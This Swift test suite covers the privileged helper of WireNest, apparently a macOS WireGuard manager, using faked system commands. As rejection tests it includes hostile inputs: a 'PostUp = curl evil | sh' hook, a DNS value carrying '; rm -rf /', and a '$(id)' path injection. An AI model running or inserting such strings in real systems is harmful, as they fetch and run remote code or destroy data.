import XCTest
@testable import WireNestCore

/// Stands in for the real binaries only at the subprocess edge; everything above it is production code.
final class FakeCommands: CommandRunning {
    /// What wg-quick left running for one `wnN` name. Teardown follows the real order: the socket
    /// goes first, then wireguard-go and the utun, and the route monitor notices last.
    struct Slot {
        var real: String
        var pgid: Int32
        var wgReachable = true
        var monitorAlive = true
        var pausesUntilGone: Int?
        var config: WireGuardConfig?
        var defaultRowsAtPause = 0
    }

    /// Synthetic: shaped like B4's observed Darwin output, but this LAN and these rows were never observed.
    var routeGet: [String: CommandResult] = [:]
    var netstatBase = "Routing tables\n\nInternet:\nDestination        Gateway            Flags               Netif Expire\n"
    /// What `ifconfig -a` lists besides live slots, which it always lists.
    var ifconfigAll = "lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 16384\n\tinet 127.0.0.1 netmask 0xff000000\n"
    /// Replaces the whole `ifconfig -a` result, for a failed or unusable enumeration.
    var ifconfigEnumeration: CommandResult?
    /// `ifconfig IF` exits 1 for a permission, socket or read error too, with the interface still there.
    var ifconfigNamedFailsGenerically = false
    var hardwarePorts = ""
    var actualEndpoints: [String: String] = [:]
    var defaultRowsAppearAfterPauses = 0
    /// `wg show IF <what>` subcommands that time out while the device itself is fine.
    var wgShowTimeouts: Set<String> = []
    /// Replaces a narrow route's netstat destination. An empty string leaves that route out of the table.
    var narrowRowDestination: [String: String] = [:]
    /// Host rows besides the slots' own, keyed by destination and written as netstat prints them.
    var hostRoutes: [String: String] = [:]
    /// Returned by `route add` instead of adding, for a refused or timed out command.
    var routeAddResult: CommandResult?
    /// Installed by a `route add` that exits 0, in place of the row it asked for.
    var routeAddInstalls: String?
    /// Whether the kernel refuses to replace a cloned row. Nothing here assumes which way a real one goes.
    var cloneBlocksRouteAdd = false
    var routeDeleteResult: CommandResult?
    var routeDeleteLeavesRow = false
    /// Replaces the whole `netstat` result, for a failed, cut or malformed table.
    var netstatResult: CommandResult?
    /// Stock wg-quick pins a default-route tunnel's own numeric endpoint on `up` and deletes it on `down`.
    var wgQuickManagesOwnEndpoint = false
    /// Called with `add` or `delete` before each route change, while the journal can still be read as it was.
    var onRouteChange: ((String) -> Void)?

    var routeChanges: [[String]] { calls.filter { $0.executable == "/sbin/route" && $0.args.first == "-q" }.map { $0.args } }

    private func ownEndpoints(of config: WireGuardConfig?) -> [String] {
        guard let config, config.peers.flatMap(\.allowedIPs).contains(where: { $0.isDefaultRoute && !$0.isIPv6 }) else { return [] }
        return config.peers.compactMap { peer in
            guard let host = peer.endpoint?.host, CIDR(host) != nil else { return nil }
            return host
        }
    }

    func installSyntheticLAN() {
        netstatBase = """
        Routing tables

        Internet:
        Destination        Gateway            Flags               Netif Expire
        default            192.168.86.1       UGScg                 en0
        127                127.0.0.1          UCS                   lo0
        192.168.86         link#7             UCS                   en0      !

        """
        ifconfigAll = """
        lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 16384
        \tinet 127.0.0.1 netmask 0xff000000
        en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
        \tinet 192.168.86.20 netmask 0xffffff00 broadcast 192.168.86.255
        \tstatus: active

        """
        hardwarePorts = "\nHardware Port: Wi-Fi\nDevice: en0\nEthernet Address: 00:00:00:00:00:01\n"
        routeGet = ["192.168.86.51": CommandResult(status: 0, output: """
           route to: 192.168.86.51
        destination: 192.168.86.0
               mask: 255.255.255.0
          interface: en0
              flags: <UP,DONE,CLONING,STATIC>
        """)]
    }

    private func slotName(forRoute address: String) -> String? {
        guard let target = CIDR(address) else { return nil }
        return slots.first { $0.value.config?.peers.flatMap(\.allowedIPs).contains { !$0.isDefaultRoute && $0.overlaps(target) } == true }?.key
    }

    var calls: [(executable: String, args: [String])] = []
    var failUp = false
    var failDown = false
    /// Prints the ready marker and exits 0 with nothing actually running.
    var upMarkerOnly = false
    var upWithoutMonitor = false
    /// `wg-quick down` exits 0 but the device keeps answering.
    var downLeavesDeviceAlive = false
    /// `wg-quick down` exits 0, `wg` can no longer reach the device and the monitor is gone, but the utun remains.
    var downLeavesInterfaceOnly = false
    /// `ifconfig` itself fails, which says nothing about the interface.
    var ifconfigBroken = false
    var monitorExitPauses = 0
    var monitorIgnoresTerm = false
    var onQuick: ((String) -> Void)?
    var slots: [String: Slot] = [:]
    var terminatedGroups: [Int32] = []
    var pauses = 0
    var dns: [String: [String]] = ["Wi-Fi": ["192.168.1.1"], "Ethernet": []]
    var failSetDNS = false
    var disabledServices: [String] = []
    var nextUtun = 7
    let paths: HelperPaths

    init(paths: HelperPaths) { self.paths = paths }

    func liveProcessGroups(matching argv: [String]) -> [Int32] {
        guard argv.count == 4, argv[0] == paths.bash, argv[1] == paths.wgQuick, argv[2] == "up" else { return [] }
        let name = URL(fileURLWithPath: argv[3]).deletingPathExtension().lastPathComponent
        return slots[name].flatMap { $0.monitorAlive ? [$0.pgid] : [] } ?? []
    }

    func terminateProcessGroup(_ pgid: Int32) {
        terminatedGroups.append(pgid)
        guard !monitorIgnoresTerm, let name = slots.first(where: { $0.value.pgid == pgid })?.key else { return }
        slots[name]?.monitorAlive = false
        if slots[name]?.wgReachable == false { slots[name] = nil }
    }

    func pause(_ seconds: TimeInterval) {
        pauses += 1
        for name in slots.keys {
            guard let remaining = slots[name]?.pausesUntilGone else { continue }
            slots[name]?.pausesUntilGone = remaining - 1
            if remaining <= 1 { slots[name] = nil }
        }
    }

    func run(_ executable: String, _ args: [String], timeout: TimeInterval, readyMarker: String?) -> CommandResult {
        calls.append((executable, args))
        if executable == paths.bash {
            let action = args[1], conf = args[2]
            let name = URL(fileURLWithPath: conf).deletingPathExtension().lastPathComponent
            let nameFile = paths.wireguardRunDir.appendingPathComponent("\(name).name")
            onQuick?(action)
            if action == "up" {
                if failUp { return CommandResult(status: 1, output: "wg setconf failed for \(testKey(1))") }
                if upMarkerOnly { return CommandResult(status: 0, output: "[+] Backgrounding route monitor") }
                try? FileManager.default.createDirectory(at: paths.wireguardRunDir, withIntermediateDirectories: true)
                let real = "utun\(nextUtun)"
                try? "\(real)\n".write(to: nameFile, atomically: true, encoding: .utf8)
                try? Data().write(to: paths.wireguardRunDir.appendingPathComponent("\(real).sock"))
                var slot = Slot(real: real, pgid: 1000 + Int32(nextUtun), monitorAlive: !upWithoutMonitor)
                slot.config = (try? String(contentsOfFile: conf, encoding: .utf8)).flatMap { try? WireGuardConfig.parse($0) }
                slot.defaultRowsAtPause = pauses + defaultRowsAppearAfterPauses
                slots[name] = slot
                if wgQuickManagesOwnEndpoint {
                    for host in ownEndpoints(of: slot.config) { hostRoutes[host] = "\(host)     192.168.86.1     UGHS     en0\n" }
                }
                nextUtun += 1
                return CommandResult(status: 0, output: "[+] Backgrounding route monitor")
            }
            if failDown { return CommandResult(status: 1, output: "cannot remove") }
            guard let slot = slots[name] else { return CommandResult(status: 1, output: "not a WireGuard interface") }
            if wgQuickManagesOwnEndpoint {
                for host in ownEndpoints(of: slot.config) { hostRoutes[host] = nil }
            }
            try? FileManager.default.removeItem(at: nameFile)
            try? FileManager.default.removeItem(at: paths.wireguardRunDir.appendingPathComponent("\(slot.real).sock"))
            if downLeavesDeviceAlive { return CommandResult(status: 0, output: "") }
            slots[name]?.wgReachable = false
            if downLeavesInterfaceOnly {
                slots[name]?.monitorAlive = false
            } else if monitorExitPauses == 0 {
                slots[name] = nil
            } else {
                slots[name]?.pausesUntilGone = monitorExitPauses
            }
            return CommandResult(status: 0, output: "")
        }
        if executable == paths.wg {
            guard slots.values.contains(where: { $0.real == args[1] && $0.wgReachable }) else {
                return CommandResult(status: 1, output: "Unable to access interface")
            }
            if let what = args.last, wgShowTimeouts.contains(what) { return CommandResult(status: 124, output: "Timed out") }
            switch args.last {
            case "latest-handshakes": return CommandResult(status: 0, output: "\(testKey(2))\t1700000000\n")
            case "transfer": return CommandResult(status: 0, output: "\(testKey(2))\t11\t22\n")
            case "endpoints":
                guard let name = slots.first(where: { $0.value.real == args[1] })?.key else { return CommandResult(status: 1, output: "") }
                if let actual = actualEndpoints[name] { return CommandResult(status: 0, output: actual) }
                let peers = slots[name]?.config?.peers ?? []
                return CommandResult(status: 0, output: peers.map { "\($0.publicKey)\t\($0.endpoint?.text ?? "(none)")\n" }.joined())
            default: return CommandResult(status: 1, output: "")
            }
        }
        if executable == "/sbin/route", args.first == "-q" {
            let endpoint = args[4]
            onRouteChange?(args[2])
            if args[2] == "add" {
                if let routeAddResult { return routeAddResult }
                if let existing = hostRoutes[endpoint], !existing.contains("UGHWI") || cloneBlocksRouteAdd {
                    return CommandResult(status: 1, output: "route: writing to routing socket: File exists")
                }
                hostRoutes[endpoint] = routeAddInstalls ?? "\(endpoint)     \(args[6])     UGHS     en0\n"
                return CommandResult(status: 0, output: "")
            }
            if let routeDeleteResult { return routeDeleteResult }
            if !routeDeleteLeavesRow { hostRoutes[endpoint] = nil }
            return CommandResult(status: 0, output: "")
        }
        if executable == "/sbin/route" {
            let address = args.last ?? ""
            if let row = hostRoutes[address] {
                let fields = row.split(whereSeparator: \.isWhitespace).map(String.init)
                let flags = fields[2].contains("W") ? "UP,GATEWAY,HOST,DONE,WASCLONED,IFSCOPE" : "UP,GATEWAY,HOST,DONE,STATIC"
                return CommandResult(status: 0, output: """
                   route to: \(address)
                destination: \(address)
                    gateway: \(fields[1])
                  interface: \(fields[3])
                      flags: <\(flags)>
                """)
            }
            if let scripted = routeGet[address] { return scripted }
            if let name = slotName(forRoute: address), let real = slots[name]?.real {
                return CommandResult(status: 0, output: "   route to: \(address)\n  interface: \(real)\n      flags: <UP,DONE,STATIC>\n")
            }
            return CommandResult(status: 1, output: "route: writing to routing socket: not in table")
        }
        if executable == "/usr/sbin/netstat" {
            if let netstatResult { return netstatResult }
            let rows = slots.values.filter { slot in
                pauses >= slot.defaultRowsAtPause && slot.config?.table != .off
                    && slot.config?.peers.flatMap(\.allowedIPs).contains { $0.isDefaultRoute && !$0.isIPv6 } == true
            }.map { "0/1                \($0.real)              USc                 \($0.real)\n128.0/1            \($0.real)              USc                 \($0.real)\n" }
            let narrow = slots.values.flatMap { slot -> [String] in
                guard slot.config?.table != .off else { return [] }
                return (slot.config?.peers.flatMap(\.allowedIPs) ?? []).filter { !$0.isDefaultRoute && !$0.isIPv6 }.compactMap { route in
                    let destination = narrowRowDestination[route.description] ?? route.description
                    return destination.isEmpty ? nil : "\(destination)     \(slot.real)     USc     \(slot.real)\n"
                }
            }
            return CommandResult(status: 0, output: netstatBase + rows.joined() + narrow.joined() + hostRoutes.keys.sorted().compactMap { hostRoutes[$0] }.joined())
        }
        if executable == "/usr/sbin/networksetup", args == ["-listallhardwareports"] {
            return CommandResult(status: 0, output: hardwarePorts)
        }
        if executable == "/sbin/ifconfig", ifconfigBroken { return CommandResult(status: 124, output: "Timed out") }
        if executable == "/sbin/ifconfig", args == ["-a"] {
            if let ifconfigEnumeration { return ifconfigEnumeration }
            let live = slots.values.map { "\($0.real): flags=8051<UP,POINTOPOINT,RUNNING,MULTICAST> mtu 1420\n" }
            return CommandResult(status: 0, output: ifconfigAll + live.joined())
        }
        if executable == "/sbin/ifconfig" {
            if ifconfigNamedFailsGenerically { return CommandResult(status: 1, output: "ifconfig: ioctl (SIOCGIFFLAGS): Operation not permitted") }
            return CommandResult(status: slots.values.contains { $0.real == args[0] } ? 0 : 1, output: "")
        }
        if executable == "/usr/sbin/networksetup" {
            switch args[0] {
            case "-listallnetworkservices":
                let enabled = dns.keys.filter { !disabledServices.contains($0) }.sorted().joined(separator: "\n")
                let disabled = disabledServices.map { "*" + $0 }.joined(separator: "\n")
                return CommandResult(status: 0, output: "An asterisk (*) denotes that a network service is disabled.\n\(enabled)\n\(disabled)\n")
            case "-getdnsservers":
                let servers = dns[args[1]] ?? []
                let text = servers.isEmpty ? "There aren't any DNS Servers set on \(args[1]).\n" : servers.joined(separator: "\n") + "\n"
                return CommandResult(status: 0, output: text)
            case "-setdnsservers":
                if failSetDNS || disabledServices.contains(args[1]) { return CommandResult(status: 1, output: "nope") }
                dns[args[1]] = args[2] == "Empty" ? [] : Array(args[2...])
                return CommandResult(status: 0, output: "")
            default: break
            }
        }
        return CommandResult(status: 127, output: "unexpected \(executable)")
    }

    var flatArgv: String { calls.map { ([$0.executable] + $0.args).joined(separator: " ") }.joined(separator: "\n") }
    var quickCalls: [[String]] { calls.filter { $0.executable == paths.bash }.map { $0.args } }
}

final class HelperEngineTests: XCTestCase {
    private var root: URL!
    private var paths: HelperPaths!
    private var commands: FakeCommands!
    private var engine: HelperEngine!

    override func setUpWithError() throws {
        root = try tempDirectory()
        paths = HelperPaths(
            runtimeDir: root.appendingPathComponent("run"),
            wireguardRunDir: root.appendingPathComponent("wg"),
            toolsDir: root.appendingPathComponent("tools"),
            durableDir: root.appendingPathComponent("durable")
        )
        commands = FakeCommands(paths: paths)
        engine = try HelperEngine(paths: paths, runner: commands)
    }

    private func conf(_ n: Int, allowed: String? = nil, dns: String? = nil) -> String {
        confText(address: "10.\(n).0.2/32", dns: dns, allowedIPs: allowed ?? "10.\(n).0.0/24")
    }

    private func ok(_ request: HelperRequest, file: StaticString = #filePath, line: UInt = #line) -> HelperResponse {
        let response = engine.handle(request)
        XCTAssertNil(response.error, file: file, line: line)
        return response
    }

    func testUpWritesPrivateSanitisedConfAndKeepsKeyOutOfArgv() throws {
        let id = UUID()
        _ = ok(.up(tunnelID: id, config: conf(1, dns: "1.1.1.1")))
        let call = try XCTUnwrap(commands.quickCalls.first)
        XCTAssertEqual(call[0], paths.toolsDir.appendingPathComponent("wg-quick").path)
        XCTAssertEqual(call[1], "up")
        let confPath = call[2]
        XCTAssertEqual(URL(fileURLWithPath: confPath).lastPathComponent, "wn0.conf")
        let text = try String(contentsOfFile: confPath, encoding: .utf8)
        XCTAssertFalse(text.lowercased().contains("dns"))
        XCTAssertTrue(text.contains(testKey(1)), "wg-quick reads the key from this root-only file")
        let mode = (try FileManager.default.attributesOfItem(atPath: confPath)[.posixPermissions] as! NSNumber).intValue
        XCTAssertEqual(mode, 0o600)
        XCTAssertFalse(commands.flatArgv.contains(testKey(1)))
    }

    func testRevalidatesAtPrivilegedBoundary() {
        let unsafe = confText(extraInterface: "PostUp = curl evil | sh")
        let response = engine.handle(.up(tunnelID: UUID(), config: unsafe))
        XCTAssertNotNil(response.error)
        XCTAssertTrue(commands.calls.isEmpty, "rejected before any subprocess")
    }

    func testRejectsConflictWithRunningTunnelAtPrivilegedBoundary() {
        _ = ok(.up(tunnelID: UUID(), config: conf(1, allowed: "10.0.0.0/8")))
        let before = commands.quickCalls.count
        let response = engine.handle(.up(tunnelID: UUID(), config: conf(2, allowed: "10.9.0.0/16")))
        XCTAssertNotNil(response.error)
        XCTAssertEqual(commands.quickCalls.count, before)
    }

    func testTwoDisjointTunnelsGetDistinctInterfacesAndStatus() throws {
        let a = UUID(), b = UUID()
        _ = ok(.up(tunnelID: a, config: conf(1)))
        _ = ok(.up(tunnelID: b, config: conf(2)))
        let status = try XCTUnwrap(ok(.status).status)
        XCTAssertEqual(Set(status.tunnels.map(\.interface)), ["utun7", "utun8"])
        XCTAssertEqual(status.protocolVersion, HelperConstants.protocolVersion)
        let tunnel = try XCTUnwrap(status.tunnels.first { $0.tunnelID == a })
        XCTAssertTrue(tunnel.alive)
        XCTAssertEqual(tunnel.peers.first?.rxBytes, 11)
        XCTAssertEqual(tunnel.peers.first?.txBytes, 22)
        XCTAssertEqual(tunnel.peers.first?.latestHandshake, Date(timeIntervalSince1970: 1_700_000_000))
        XCTAssertEqual(tunnel.fingerprint, try WireGuardConfig.parse(conf(1)).fingerprint)
    }

    func testStatusDoesNotRequestAnythingExposingPrivateKeys() {
        _ = ok(.up(tunnelID: UUID(), config: conf(1)))
        _ = ok(.status)
        let wgCalls = commands.calls.filter { $0.executable == paths.wg }.map { $0.args }
        XCTAssertFalse(wgCalls.isEmpty)
        XCTAssertFalse(wgCalls.contains { $0.contains("dump") || $0.contains("private-key") })
    }

    func testFreedInterfaceSlotIsReused() throws {
        let a = UUID()
        _ = ok(.up(tunnelID: a, config: conf(1)))
        _ = ok(.down(tunnelID: a))
        _ = ok(.up(tunnelID: UUID(), config: conf(2)))
        XCTAssertEqual(URL(fileURLWithPath: commands.quickCalls.last![2]).lastPathComponent, "wn0.conf")
    }

    func testFailedUpCleansConfAndRedactsKeysFromError() throws {
        commands.failUp = true
        let response = engine.handle(.up(tunnelID: UUID(), config: conf(1)))
        let error = try XCTUnwrap(response.error)
        XCTAssertFalse(error.contains(testKey(1)))
        XCTAssertTrue(error.contains("<redacted>"))
        XCTAssertFalse(FileManager.default.fileExists(atPath: paths.runtimeDir.appendingPathComponent("wn0.conf").path))
        XCTAssertEqual(ok(.status).status?.tunnels.count, 0)
    }

    func testDownRemovesKeyFile() throws {
        let id = UUID()
        _ = ok(.up(tunnelID: id, config: conf(1)))
        let path = paths.runtimeDir.appendingPathComponent("wn0.conf").path
        XCTAssertTrue(FileManager.default.fileExists(atPath: path))
        _ = ok(.down(tunnelID: id))
        XCTAssertFalse(FileManager.default.fileExists(atPath: path))
    }

    func testDownOfUnknownTunnelIsNoop() {
        _ = ok(.down(tunnelID: UUID()))
        XCTAssertTrue(commands.quickCalls.isEmpty)
    }

    func testFailedDownOfLiveInterfaceReportsAndKeepsTracking() {
        let id = UUID()
        _ = ok(.up(tunnelID: id, config: conf(1)))
        commands.failDown = true
        XCTAssertNotNil(engine.handle(.down(tunnelID: id)).error)
        XCTAssertEqual(ok(.status).status?.tunnels.count, 1)
    }

    // MARK: DNS

    func testDNSSnapshotAppliedThenRestoredAfterFinalDown() {
        let a = UUID(), b = UUID()
        _ = ok(.up(tunnelID: a, config: conf(1)))
        _ = ok(.up(tunnelID: b, config: conf(2)))
        _ = ok(.setDNS(primary: "9.9.9.9", secondary: "149.112.112.112"))
        XCTAssertEqual(commands.dns["Wi-Fi"], ["9.9.9.9", "149.112.112.112"])
        XCTAssertEqual(commands.dns["Ethernet"], ["9.9.9.9", "149.112.112.112"])

        _ = ok(.down(tunnelID: a))
        XCTAssertEqual(commands.dns["Wi-Fi"], ["9.9.9.9", "149.112.112.112"], "another tunnel is still up")
        _ = ok(.down(tunnelID: b))
        XCTAssertEqual(commands.dns["Wi-Fi"], ["192.168.1.1"])
        XCTAssertEqual(commands.dns["Ethernet"], [])
    }

    func testEmptyPrimaryLeavesSystemDNSUntouched() {
        _ = ok(.up(tunnelID: UUID(), config: conf(1, dns: "8.8.8.8")))
        _ = ok(.setDNS(primary: "", secondary: ""))
        XCTAssertEqual(commands.dns["Wi-Fi"], ["192.168.1.1"])
        XCTAssertFalse(commands.calls.contains { $0.args.first == "-setdnsservers" })
    }

    func testClearingPrimaryRestoresOriginals() {
        _ = ok(.up(tunnelID: UUID(), config: conf(1)))
        _ = ok(.setDNS(primary: "9.9.9.9", secondary: ""))
        _ = ok(.setDNS(primary: "", secondary: ""))
        XCTAssertEqual(commands.dns["Wi-Fi"], ["192.168.1.1"])
    }

    func testReapplyIsIdempotentAndDoesNotResnapshotOurOwnValues() {
        _ = ok(.up(tunnelID: UUID(), config: conf(1)))
        _ = ok(.setDNS(primary: "9.9.9.9", secondary: ""))
        let setCount = commands.calls.filter { $0.args.first == "-setdnsservers" }.count
        _ = ok(.setDNS(primary: "9.9.9.9", secondary: ""))
        XCTAssertEqual(commands.calls.filter { $0.args.first == "-setdnsservers" }.count, setCount)
        _ = ok(.setDNS(primary: "", secondary: ""))
        XCTAssertEqual(commands.dns["Wi-Fi"], ["192.168.1.1"])
    }

    func testNewServiceIsSnapshottedOnReapply() {
        _ = ok(.up(tunnelID: UUID(), config: conf(1)))
        _ = ok(.setDNS(primary: "9.9.9.9", secondary: ""))
        commands.dns["USB LAN"] = ["10.0.0.53"]
        _ = ok(.setDNS(primary: "9.9.9.9", secondary: ""))
        XCTAssertEqual(commands.dns["USB LAN"], ["9.9.9.9"])
        _ = ok(.setDNS(primary: "", secondary: ""))
        XCTAssertEqual(commands.dns["USB LAN"], ["10.0.0.53"])
    }

    func testDNSRejectsNonIPAndRefusesWithoutTunnel() {
        _ = ok(.up(tunnelID: UUID(), config: conf(1)))
        XCTAssertNotNil(engine.handle(.setDNS(primary: "1.1.1.1; rm -rf /", secondary: "")).error)
        XCTAssertNotNil(engine.handle(.setDNS(primary: "", secondary: "1.1.1.1")).error)
        _ = ok(.downAll)
        XCTAssertNotNil(engine.handle(.setDNS(primary: "1.1.1.1", secondary: "")).error)
        XCTAssertEqual(commands.dns["Wi-Fi"], ["192.168.1.1"])
    }

    func testDisabledServicesAreNotTouched() {
        commands.disabledServices = ["VPN Port"]
        _ = ok(.up(tunnelID: UUID(), config: conf(1)))
        _ = ok(.setDNS(primary: "9.9.9.9", secondary: ""))
        XCTAssertFalse(commands.calls.contains { $0.args.contains("VPN Port") })
    }

    func testFailedUpOfOnlyTunnelRestoresDNS() {
        let id = UUID()
        _ = ok(.up(tunnelID: id, config: conf(1)))
        _ = ok(.setDNS(primary: "9.9.9.9", secondary: ""))
        // A restart (changed config) whose new attempt fails leaves no tunnel holding DNS.
        commands.failUp = true
        XCTAssertNotNil(engine.handle(.up(tunnelID: id, config: conf(2))).error)
        XCTAssertEqual(commands.dns["Wi-Fi"], ["192.168.1.1"])
    }

    func testDownAllRestoresDNSAndDropsEverything() throws {
        _ = ok(.up(tunnelID: UUID(), config: conf(1)))
        _ = ok(.up(tunnelID: UUID(), config: conf(2)))
        _ = ok(.setDNS(primary: "9.9.9.9", secondary: ""))
        _ = ok(.downAll)
        XCTAssertEqual(ok(.status).status?.tunnels.count, 0)
        XCTAssertEqual(commands.dns["Wi-Fi"], ["192.168.1.1"])
    }

    func testCrashRecoveryAdoptsLiveTunnelsAndKeepsDNSSnapshot() throws {
        let id = UUID()
        _ = ok(.up(tunnelID: id, config: conf(1)))
        _ = ok(.setDNS(primary: "9.9.9.9", secondary: ""))

        let restarted = try HelperEngine(paths: paths, runner: commands)
        restarted.recoverOnStart()
        let status = try XCTUnwrap(restarted.handle(.status).status)
        XCTAssertEqual(status.tunnels.map(\.tunnelID), [id])
        XCTAssertEqual(commands.dns["Wi-Fi"], ["9.9.9.9"], "a live tunnel keeps the managed DNS")
        _ = restarted.handle(.downAll)
        XCTAssertEqual(commands.dns["Wi-Fi"], ["192.168.1.1"])
    }

    func testBootRecoveryRestoresDurableDNSSnapshotWhenNoTunnelSurvived() throws {
        _ = ok(.up(tunnelID: UUID(), config: conf(1)))
        _ = ok(.setDNS(primary: "9.9.9.9", secondary: ""))
        // A reboot clears /var/run, including tunnel name files and session, but not the snapshot.
        try FileManager.default.removeItem(at: paths.wireguardRunDir)
        try FileManager.default.removeItem(at: paths.runtimeDir)

        let rebooted = try HelperEngine(paths: paths, runner: commands)
        rebooted.recoverOnStart()
        XCTAssertEqual(commands.dns["Wi-Fi"], ["192.168.1.1"])
        XCTAssertEqual(rebooted.handle(.status).status?.tunnels.count, 0)
    }

    func testFailedDNSRestoreKeepsSnapshotForRetry() throws {
        let id = UUID()
        _ = ok(.up(tunnelID: id, config: conf(1)))
        _ = ok(.setDNS(primary: "9.9.9.9", secondary: ""))
        commands.failSetDNS = true
        XCTAssertNotNil(engine.handle(.down(tunnelID: id)).error)
        commands.failSetDNS = false
        let again = try HelperEngine(paths: paths, runner: commands)
        again.recoverOnStart()
        XCTAssertEqual(commands.dns["Wi-Fi"], ["192.168.1.1"])
    }

    // MARK: pure helpers

    func testWgShowParsing() {
        let peers = parseWgShow(handshakes: "\(testKey(2))\t0\n\(testKey(3))\t1700000000\n", transfer: "\(testKey(2))\t1\t2\n\(testKey(3))\t3\t4\n")
        XCTAssertEqual(peers.count, 2)
        XCTAssertNil(peers[0].latestHandshake, "0 means no handshake yet")
        XCTAssertEqual(peers[1].txBytes, 4)
    }

    func testRedaction() {
        XCTAssertEqual(redactSecrets("key \(testKey(1)) tail"), "key <redacted> tail")
        XCTAssertEqual(redactSecrets("no secrets 10.0.0.1/24"), "no secrets 10.0.0.1/24")
    }

    func testRequestsRoundTripJSONAndOversizedRejected() throws {
        let request = HelperRequest.up(tunnelID: UUID(), config: "x")
        let decoded = try HelperRequest.decodeBounded(JSONEncoder().encode(request))
        XCTAssertEqual(decoded, request)
        XCTAssertThrowsError(try HelperRequest.decodeBounded(Data(repeating: 32, count: HelperConstants.maxRequestBytes + 1)))
        XCTAssertThrowsError(try HelperRequest.decodeBounded(Data("{\"shell\":{\"cmd\":\"id\"}}".utf8)))
    }
}

final class InstallProtocolTests: XCTestCase {
    func testInstallAppleScriptEscapesPathAndUsesQuotedForm() {
        let script = adminInstallAppleScript(helperPath: "/Applications/We\"ird $(id)\\.app/H", arguments: ["--install", "--uid", "501"])
        XCTAssertEqual(script, "do shell script (quoted form of \"/Applications/We\\\"ird $(id)\\\\.app/H\") & \" '--install' '--uid' '501'\" with administrator privileges")
    }

    func testBundleLayoutDerivesAppFromHelperPath() {
        let layout = AppBundleLayout(helperExecutable: URL(fileURLWithPath: "/Applications/WireNest.app/Contents/Library/LaunchServices/WireNestHelper"))
        XCTAssertEqual(layout?.appBundle.path, "/Applications/WireNest.app")
        XCTAssertEqual(layout?.toolsDir.path, "/Applications/WireNest.app/Contents/Resources/Tools")
        XCTAssertNil(AppBundleLayout(helperExecutable: URL(fileURLWithPath: "/tmp/WireNestHelper")))
    }

    func testLaunchdPlistIsFixedAndKeepsTunnelsAcrossHelperExit() {
        let plist = launchdPlist()
        XCTAssertEqual(plist["Label"] as? String, "com.marcuschiu.WireNest.helper")
        XCTAssertEqual(plist["ProgramArguments"] as? [String], ["/Library/PrivilegedHelperTools/com.marcuschiu.WireNest/WireNestHelper", "--daemon"])
        XCTAssertEqual((plist["MachServices"] as? [String: Bool])?["com.marcuschiu.WireNest.helper"], true)
        XCTAssertEqual(plist["AbandonProcessGroup"] as? Bool, true)
        XCTAssertEqual(plist["RunAtLoad"] as? Bool, true)
    }

    func testClientRequirementPinsCdHash() {
        XCTAssertEqual(HelperClientPin(ownerUID: 501, appCDHash: "abc123").codeRequirement, "cdhash H\"abc123\"")
    }

    func testPinValidationRejectsMalformed() {
        XCTAssertNil(HelperClientPin(validating: 0, cdHash: Data([1, 2])))
        XCTAssertNil(HelperClientPin(validating: 501, cdHash: Data()))
        XCTAssertEqual(HelperClientPin(validating: 501, cdHash: Data([0xab, 0x01]))?.appCDHash, "ab01")
    }
}
